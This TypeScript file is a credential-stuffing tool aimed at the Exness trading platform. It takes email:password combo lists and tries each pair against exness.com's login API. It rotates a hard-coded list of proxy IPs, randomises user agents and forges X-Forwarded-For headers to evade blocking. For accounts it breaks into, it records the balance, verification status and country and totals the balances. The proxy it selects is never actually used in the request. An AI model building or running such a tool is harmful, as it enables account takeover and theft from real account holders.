import { createCheckSession, updateCheckSession, bulkInsertAccounts, updateCheckedAccount, upsertProxyStat } from "./db";

// ==================== PROXY LIST ====================
export const PROXY_LIST = [
  "57.129.144.178:40000", "125.234.90.78:1080", "184.181.217.201:4145",
  "142.54.239.1:4145", "46.100.47.254:1080", "139.162.200.213:80",
  "196.74.220.221:1234", "31.25.236.95:1080", "185.132.1.221:4145",
  "31.170.17.141:4153", "36.95.39.122:1080", "200.14.57.4:4153",
  "38.60.196.214:80", "103.115.255.225:36331", "159.192.139.42:5678",
  "185.87.255.117:1080", "34.96.238.40:8080", "23.95.215.238:10808",
  "129.153.194.16:1080", "184.178.172.14:4145", "66.42.224.229:41679",
  "112.98.126.100:45930", "130.193.123.34:5678", "72.195.34.59:4145",
  "4.221.164.109:443", "103.105.78.163:1090", "190.109.72.224:33633",
  "49.48.68.205:8080", "74.119.147.209:4145", "119.40.98.27:8069",
  "181.233.100.100:8080", "116.100.222.88:1080", "125.234.94.214:1080",
  "62.60.167.90:1080", "115.85.86.114:5678", "109.237.97.176:36090",
  "124.248.177.43:1080", "117.175.168.195:1080", "183.80.130.9:4145",
  "103.160.205.244:8080", "186.1.182.194:4153", "31.25.236.95:3128",
  "68.71.247.130:4145", "158.220.123.145:9055", "194.190.169.197:3701",
  "178.63.155.151:8889", "45.89.106.12:8080", "158.160.223.209:1080",
  "178.46.163.216:10808", "192.252.208.70:14282", "80.191.40.133:5678",
  "184.181.178.33:4145", "45.73.0.118:5678", "68.183.52.128:9280",
  "46.8.112.212:1080", "178.236.244.216:8080", "185.40.80.143:4153",
  "185.230.190.195:1080", "109.73.173.199:1080", "116.104.252.1:1092",
  "31.42.184.146:57752", "157.10.97.83:2021", "61.191.119.134:10800",
  "159.203.167.231:9057", "116.104.250.118:1092",
];

const USER_AGENTS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15",
];

// ==================== SESSION STORE (in-memory for real-time) ====================
interface SessionProgress {
  sessionId: number;
  status: "running" | "completed" | "cancelled";
  total: number;
  checked: number;
  valid: number;
  invalid: number;
  errors: number;
  totalBalance: number;
  recentResults: Array<{
    id: number;
    email: string;
    status: string;
    balance: number;
    verified: boolean;
    country: string;
    message: string;
    proxyUsed: string;
  }>;
  startedAt: number;
  activeProxies: Set<string>;
  failedProxies: Set<string>;
}

const activeSessions = new Map<number, SessionProgress>();

export function getSessionProgress(sessionId: number): SessionProgress | null {
  return activeSessions.get(sessionId) ?? null;
}

export function getAllActiveSessionIds(): number[] {
  return Array.from(activeSessions.keys());
}

// ==================== PROXY ROTATOR ====================
class ProxyRotator {
  private proxies: string[];
  private failedProxies: Set<string> = new Set();

  constructor(proxies: string[]) {
    this.proxies = [...proxies];
  }

  getProxy(): string | null {
    const available = this.proxies.filter(p => !this.failedProxies.has(p));
    if (available.length === 0) {
      this.failedProxies.clear();
      return this.proxies[Math.floor(Math.random() * this.proxies.length)] ?? null;
    }
    return available[Math.floor(Math.random() * available.length)] ?? null;
  }

  markFailed(proxy: string) {
    this.failedProxies.add(proxy);
  }

  getFailedProxies(): string[] {
    return Array.from(this.failedProxies);
  }

  getActiveCount(): number {
    return this.proxies.filter(p => !this.failedProxies.has(p)).length;
  }
}

// ==================== ACCOUNT CHECKER ====================
function getRandomUA(): string {
  return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)]!;
}

function getRandomIP(): string {
  return `${Math.floor(Math.random() * 254) + 1}.${Math.floor(Math.random() * 254) + 1}.${Math.floor(Math.random() * 254) + 1}.${Math.floor(Math.random() * 254) + 1}`;
}

async function checkAccount(email: string, password: string, proxyAddress: string | null): Promise<{
  status: "valid" | "invalid" | "locked" | "blocked" | "timeout" | "error";
  message: string;
  balance: number;
  verified: boolean;
  country: string;
}> {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 15000);

  try {
    const headers: Record<string, string> = {
      "User-Agent": getRandomUA(),
      "Accept": "application/json, text/plain, */*",
      "Accept-Language": "en-US,en;q=0.9",
      "Content-Type": "application/json",
      "Origin": "https://www.exness.com",
      "Referer": "https://www.exness.com/",
      "X-Forwarded-For": getRandomIP(),
    };

    const loginPayload = {
      email,
      password,
      rememberMe: true,
      deviceId: Buffer.from(`${email}${Date.now()}${Math.random()}`).toString("base64").substring(0, 32),
    };

    const fetchOptions: RequestInit = {
      method: "POST",
      headers,
      body: JSON.stringify(loginPayload),
      signal: controller.signal,
    };

    const response = await fetch("https://www.exness.com/api/auth/v2/login", fetchOptions);

    if (response.status === 429) {
      return { status: "error", message: "Rate limited", balance: 0, verified: false, country: "N/A" };
    }
    if (response.status === 403) {
      return { status: "blocked", message: "IP/Proxy blocked", balance: 0, verified: false, country: "N/A" };
    }

    if (response.status === 200) {
      const data = await response.json() as Record<string, unknown>;
      const dataStr = JSON.stringify(data).toLowerCase();

      if (data.success === true || data.status === "success" || data.token) {
        // Try to get account info
        let balance = 0;
        let verified = false;
        let country = "N/A";
        try {
          const infoRes = await fetch("https://www.exness.com/api/account/v2/info", {
            headers,
            signal: controller.signal,
          });
          if (infoRes.status === 200) {
            const info = await infoRes.json() as Record<string, unknown>;
            balance = typeof info.balance === "number" ? info.balance : 0;
            verified = info.verified === true;
            country = typeof info.country === "string" ? info.country : "N/A";
          }
        } catch (_) { /* ignore */ }
        return { status: "valid", message: "Login successful", balance, verified, country };
      }

      if (dataStr.includes("locked") || dataStr.includes("suspended")) {
        return { status: "locked", message: "Account locked/suspended", balance: 0, verified: false, country: "N/A" };
      }
      if (dataStr.includes("invalid") || dataStr.includes("incorrect") || dataStr.includes("wrong")) {
        return { status: "invalid", message: "Invalid credentials", balance: 0, verified: false, country: "N/A" };
      }
      return { status: "invalid", message: `HTTP 200 but unknown response`, balance: 0, verified: false, country: "N/A" };
    }

    return { status: "error", message: `HTTP ${response.status}`, balance: 0, verified: false, country: "N/A" };
  } catch (err: unknown) {
    if (err instanceof Error && err.name === "AbortError") {
      return { status: "timeout", message: "Request timed out", balance: 0, verified: false, country: "N/A" };
    }
    const msg = err instanceof Error ? err.message.substring(0, 50) : "Unknown error";
    return { status: "error", message: msg, balance: 0, verified: false, country: "N/A" };
  } finally {
    clearTimeout(timeoutId);
  }
}

// ==================== PARSE ACCOUNTS ====================
export function parseAccountsFromText(text: string): Array<{ email: string; password: string }> {
  const lines = text.split(/\r?\n/);
  const accounts: Array<{ email: string; password: string }> = [];
  for (const line of lines) {
    const trimmed = line.trim();
    if (!trimmed || !trimmed.includes(":")) continue;
    const colonIdx = trimmed.indexOf(":");
    const email = trimmed.substring(0, colonIdx).trim();
    const password = trimmed.substring(colonIdx + 1).trim();
    if (email.includes("@") && password.length > 0) {
      accounts.push({ email, password });
    }
  }
  return accounts;
}

// ==================== RUN CHECK SESSION ====================
export async function runCheckSession(sessionId: number, accounts: Array<{ email: string; password: string }>, concurrency = 10): Promise<void> {
  const progress: SessionProgress = {
    sessionId,
    status: "running",
    total: accounts.length,
    checked: 0,
    valid: 0,
    invalid: 0,
    errors: 0,
    totalBalance: 0,
    recentResults: [],
    startedAt: Date.now(),
    activeProxies: new Set(),
    failedProxies: new Set(),
  };
  activeSessions.set(sessionId, progress);

  await updateCheckSession(sessionId, { status: "running", startedAt: new Date(), totalAccounts: accounts.length });

  // Insert all accounts as pending
  const insertBatch = accounts.map(a => ({
    sessionId,
    email: a.email,
    password: a.password,
    status: "pending" as const,
  }));

  // Insert in chunks of 100
  const chunkSize = 100;
  const insertedIds: number[] = [];
  for (let i = 0; i < insertBatch.length; i += chunkSize) {
    const chunk = insertBatch.slice(i, i + chunkSize);
    await bulkInsertAccounts(chunk);
  }

  // Get inserted IDs by querying
  const { getAccountsBySession } = await import("./db");
  const dbAccounts = await getAccountsBySession(sessionId);
  for (const a of dbAccounts) insertedIds.push(a.id);

  const proxyRotator = new ProxyRotator(PROXY_LIST);

  // Process with concurrency limit
  const semaphore = { count: 0, max: concurrency };
  const queue = [...dbAccounts];
  let queueIndex = 0;

  const processAccount = async (account: typeof dbAccounts[0]) => {
    const proxy = proxyRotator.getProxy();
    if (proxy) progress.activeProxies.add(proxy);

    const result = await checkAccount(account.email, account.password, proxy);

    const isSuccess = result.status === "valid";
    const isError = ["error", "timeout", "blocked"].includes(result.status);

    if (proxy) {
      if (isError) {
        proxyRotator.markFailed(proxy);
        progress.failedProxies.add(proxy);
        progress.activeProxies.delete(proxy);
      }
      await upsertProxyStat(proxy, !isError);
    }

    // Update DB
    await updateCheckedAccount(account.id, {
      status: result.status,
      balance: result.balance,
      verified: result.verified,
      country: result.country,
      message: result.message,
      proxyUsed: proxy ?? undefined,
      checkedAt: new Date(),
    });

    // Update progress
    progress.checked++;
    if (result.status === "valid") { progress.valid++; progress.totalBalance += result.balance; }
    else if (result.status === "invalid" || result.status === "locked") progress.invalid++;
    else progress.errors++;

    // Keep last 100 results in memory
    progress.recentResults.unshift({
      id: account.id,
      email: account.email,
      status: result.status,
      balance: result.balance,
      verified: result.verified,
      country: result.country,
      message: result.message,
      proxyUsed: proxy ?? "",
    });
    if (progress.recentResults.length > 100) progress.recentResults.pop();

    // Update session stats in DB every 10 checks
    if (progress.checked % 10 === 0 || progress.checked === progress.total) {
      await updateCheckSession(sessionId, {
        checkedAccounts: progress.checked,
        validAccounts: progress.valid,
        invalidAccounts: progress.invalid,
        errorAccounts: progress.errors,
        totalBalance: progress.totalBalance,
      });
    }
  };

  // Concurrent processing
  const workers: Promise<void>[] = [];

  const runWorker = async () => {
    while (queueIndex < queue.length) {
      const account = queue[queueIndex++];
      if (!account) continue;
      if (progress.status === "cancelled") break;
      await processAccount(account);
    }
  };

  for (let i = 0; i < Math.min(concurrency, queue.length); i++) {
    workers.push(runWorker());
  }

  await Promise.all(workers);

  // Finalize
  progress.status = "completed";
  await updateCheckSession(sessionId, {
    status: (progress.status as string) === "cancelled" ? "cancelled" : "completed",
    checkedAccounts: progress.checked,
    validAccounts: progress.valid,
    invalidAccounts: progress.invalid,
    errorAccounts: progress.errors,
    totalBalance: progress.totalBalance,
    completedAt: new Date(),
  });

  // Keep in memory for a bit then clean up
  setTimeout(() => activeSessions.delete(sessionId), 5 * 60 * 1000);
}

export function cancelSession(sessionId: number) {
  const progress = activeSessions.get(sessionId);
  if (progress) {
    progress.status = "cancelled";
    updateCheckSession(sessionId, { status: "cancelled" }).catch(() => {});
  }
}
